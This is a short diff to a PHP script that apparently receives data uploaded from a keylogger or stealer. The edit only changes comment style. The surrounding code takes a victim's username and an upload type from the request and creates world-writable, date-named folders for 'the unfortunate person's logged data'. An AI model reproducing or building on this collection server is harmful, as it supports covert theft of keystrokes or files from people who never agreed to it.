@@ -42,13 +42,13 @@ function CheckFolder($folder){
         mkdir($folder, 0777, true);
     }
 }
-// The unfortunate person's username on their PC.
+/// The unfortunate person's username on their PC.
 $username = $_GET["username"];
-// The type of file to upload.
+/// The type of file to upload.
 $uploadtype = $_GET["type"];
-// Today's date.
+/// Today's date.
 $date = date("Y-m-d");
-// A folder dedicated for storing the unfortunate person's logged data.
+/// A folder dedicated for storing the unfortunate person's logged data.
 $userfolder = $date . "/" . FilterFilename($username);
 /// Check if the current date's folder exist. If not create it.
 CheckFolder($userfolder);
